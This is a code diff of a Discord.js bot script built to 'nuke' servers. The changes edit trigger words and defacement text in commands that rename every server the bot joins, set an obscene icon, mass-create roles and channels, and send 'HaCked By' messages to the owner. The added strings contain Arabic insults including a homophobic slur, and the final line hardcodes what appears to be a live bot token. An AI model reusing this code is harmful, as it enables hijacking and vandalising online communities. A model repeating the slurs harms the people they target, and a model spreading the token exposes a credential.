@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const LOka = new Discord.Client();
-console.log('By xR1');
+console.log('By - xR1 ');
 LOka.on('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
  
@@ -8,10 +8,10 @@ LOka.on('ready', () => {
 LOka.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('      ~            ~  By : xR1 ~           ~    ');
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  xR1 " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
  
        
    
@@ -22,55 +22,55 @@ LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
   var argresult = args.join(' ');
-  if (message.content.startsWith('.')) {
+  if (message.content.startsWith('hix15')) {
     LOka.user.setUsername(argresult);
   }
-    if (message.content.startsWith(prefix + '.')) {
+    if (message.content.startsWith(prefix + 'on123')) {
     LOka.user.setStatus(argresult);
   }
 });
  
-var x1 = "a"
+var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/355815702596157441/424724494939324418/Middle_Finger.png`)
  
 }
 });
-var x1 = "a"
+var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("bY : ~~ xR1")
+LOka.user.setUsername("HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث")
  
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by xR1 `,'https://www.twitch.tv/hix')
+LOka.user.setGame(`HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث`,'https://www.twitch.tv/hix')
  
 }
 });
  
 LOka.on('message', message => {
-     if (message.content === "a") {
+     if (message.content === ".") {
          LOka.guilds.forEach(m =>{
              m.setIcon(`https://cdn.discordapp.com/attachments/355815702596157441/424724494939324418/Middle_Finger.png`)
 })
 }
 });
 LOka.on('message', message => {
-     if (message.content === "a") {
+     if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`HaCked By xR1 - Dexs تحذير اول`)
+             m.setName(`HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث`)
 })
 }
 });
  
 LOka.on('message', message => {
-     if (message.content === "a") {
+     if (message.content === ".") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/355815702596157441/424724494939324418/Middle_Finger.png`)
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
  
 }
 });
@@ -78,10 +78,10 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "a") {
+     if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "HaCked By xR1 - Dexs تحذير اول",
+        name : "HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -284,7 +284,7 @@ LOka.on('message', message => {
 }
 });
 LOka.on('message', message => {
-         if (message.content === "1") {
+         if (message.content === "k") {
                LOka.guilds.forEach(m =>{
 m.createChannel('HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث', 'text');
 m.createChannel('HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث', 'text');
@@ -338,7 +338,7 @@ m.createChannel('HaCked By : xR1 - Dexs قايلك لاتغلط على امي ي
 });
  
 LOka.on('message', message => {
-         if (message.content === "2") {
+         if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث', 'voice');
 m.createChannel('HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث', 'voice');
@@ -417,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send('HaCked By : ~ xR1 - Dexs تحذير اول قايلك لاتغلط على أمي').catch(e => { return void e; });
+  await guild.owner.send('HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث').catch(e => { return void e; });
  
  
  
@@ -436,9 +436,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('xR1', 'text')
+    await guild.createChannel('HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث', 'text');
  
-      await guild.createChannel('xR1', 'voice');
+      await guild.createChannel('HaCked By : xR1 - Dexs قايلك لاتغلط على امي يـ مخنث', 'voice');
  
  
  
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-    client.login(process.env.SYSTEM);
+LOka.login("NjA3NzcxMDY3Njg3MTA4NjE5.XVAGtQ.Ji6TPiVlYLjrHay3EGODLffGvFIوكن البوت")
